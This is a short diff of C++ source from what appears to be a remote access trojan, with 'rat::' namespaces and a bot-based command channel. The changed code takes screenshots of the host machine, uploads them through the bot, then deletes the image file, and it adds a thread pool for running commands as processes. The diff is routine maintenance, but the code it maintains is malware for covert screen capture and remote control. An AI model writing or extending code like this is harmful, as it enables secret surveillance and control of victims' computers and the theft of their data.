@@ -71,18 +71,20 @@ void Handler::handleScreenshotCommand() {
         bool success = rat::media::screenshot::takeScreenshot(image_path, output_buffer);
         
         std::lock_guard<std::mutex> lock(backing_bot_mutex);
+
         if (success && std::filesystem::exists(image_path)) {
             DEBUG_LOG("{} taken", image_path.string());
 
             if (this->backing_bot->sendPhoto(image_path) != rat::tbot::BotResponse::SUCCESS) {
                 ERROR_LOG("Failed uploading {}", image_path.string());
             }
-            rat::system::removeFile(image_path);
         }
         if (!output_buffer.empty()) {
             this->backing_bot->sendMessage(output_buffer);
         }
+        rat::system::removeFile(image_path);
     });
+
     this->bot->sendMessage("Screenshot command launched.");
 }
 
@@ -133,6 +135,7 @@ void Handler::parseAndHandleProcessCommand() {
         .timeout = std::chrono::milliseconds(timeout),
         .thread_pool = p_process_pool, // Assuming you have a thread_pool member
         .mutexes    =  std::nullopt,  // Assuming you have a vector of mutexes
+        .secondary_thread_pool = this->secondary_helper_pool.get(),
         .callback = process_lambda
     };
     ::rat::process::runAsyncProcess(process_context);
